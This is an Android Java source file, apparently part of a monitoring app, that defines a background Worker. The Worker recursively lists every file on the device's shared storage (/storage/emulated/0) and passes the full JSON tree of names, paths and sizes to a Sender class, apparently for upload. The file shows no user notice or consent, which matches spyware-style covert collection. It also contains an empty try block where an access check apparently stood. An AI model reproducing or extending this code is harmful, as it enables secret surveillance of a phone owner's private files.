package com.behavioralanalysis.service;

import android.content.Context;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

public class Files extends Worker {
    public static final String TAG = "file";
    private Context context;
    public Files(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }


    private static JSONObject walk(File sourceFile) {
        JSONObject result = new JSONObject();
        try {
            result.put("name", sourceFile.getName());
            result.put("isDir", sourceFile.isDirectory());
            result.put("path", sourceFile.getAbsoluteFile());
            result.put("size", sourceFile.length() / 1024);
            if (sourceFile.isDirectory()) {
                File[] files = sourceFile.listFiles();
                JSONArray array = new JSONArray();
                for (File file : files) {
                    array.put(walk(file));
                }
                result.put("files", array);
            } else {
                return result;
            }
        } catch (JSONException ex) {
            ex.printStackTrace();
        }

        return result;
    }

    @NonNull
    @Override
    public Result doWork() {

        try {
            JSONArray array = new JSONArray();

            File dir = new File("/storage/emulated/0");
            if (!dir.canRead()) {
                try {
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
            Sender.send(TAG, walk(dir).toString());
            return Result.success();
        } catch (Exception ex) {
            return Result.failure();
        }
    }
}
